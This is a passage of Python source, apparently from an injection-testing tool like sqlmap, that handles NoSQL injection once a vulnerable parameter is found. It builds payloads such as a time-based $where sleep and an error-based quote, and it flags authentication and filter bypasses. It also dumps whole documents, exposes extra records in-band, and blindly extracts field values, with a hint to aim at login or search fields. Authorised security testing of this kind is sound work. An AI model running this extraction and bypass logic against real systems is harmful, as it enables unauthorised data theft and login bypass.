                title, payload = "time-based blind (server-side JavaScript $where)", "%s=' || (sleep loop) || '" % key
            else:
                title, payload = "error-based", "%s=%s'" % (key, _originalValue(place, parameter) or "1")
            report = "---\nParameter: %s (%s)\n    Type: NoSQL injection\n    Title: %s %s\n    Payload: %s\n---" % (key, place, vector.dbms, title, payload)
            conf.dumper.singleString(report)

            if vector.bypass:
                infoMsg = "%s parameter '%s' can be coerced always-true with '%s' (e.g. authentication/filter bypass)" % (place, key, vector.bypass)
                logger.info(infoMsg)

            dumped = False

            # a named whole-document dump is preferred over the unnamed in-band table
            if vector.dump is not None:
                infoMsg = "retrieving the reachable document(s)"
                logger.info(infoMsg)
                records = vector.dump()
                if records:
                    columns, rows = records
                    infoMsg = "dumped %d record%s (%d field%s)" % (len(rows), 's' if len(rows) != 1 else '', len(columns), 's' if len(columns) != 1 else '')
                    logger.info(infoMsg)
                    conf.dumper.singleString("NoSQL: %s parameter '%s' %s:\n%s" % (place, key, "documents" if len(rows) != 1 else "document", _grid(columns, rows)))
                    dumped = True

            if not dumped and vector.template is not None:
                exposure = _inband(place, parameter, vector.template)
                if exposure:
                    infoMsg = "the always-true payload returns additional records (in-band data exposure)"
                    logger.info(infoMsg)
                    _dumpInband(place, key, exposure)
                    dumped = True

            if vector.lengthValue is not None:
                value = _extract(vector.template, vector.fetch, vector.lengthValue, vector.charValue, vector.truth)
                if value is not None:
                    conf.dumper.singleString("NoSQL: %s parameter '%s' -> %s" % (place, key, repr(value)))
                    dumped = True

            if not dumped:
                if vector.template is None and vector.truth is None and vector.dump is None:
                    warnMsg = "injection is detection-only for back-end '%s' (no extraction oracle for this engine)" % vector.dbms
                else:
                    warnMsg = "injection on '%s' is confirmed but yielded no data here: this point exposes only a boolean oracle on a non-extractable (e.g. numeric) field. Target a string-compared parameter (e.g. a login/search field) to blindly read a value" % key
                logger.warning(warnMsg)

    if not found:
        warnMsg = "no parameter appears to be injectable via NoSQL injection (%d tested)" % tested
        logger.warning(warnMsg)

    logger.info("NoSQL scan complete")
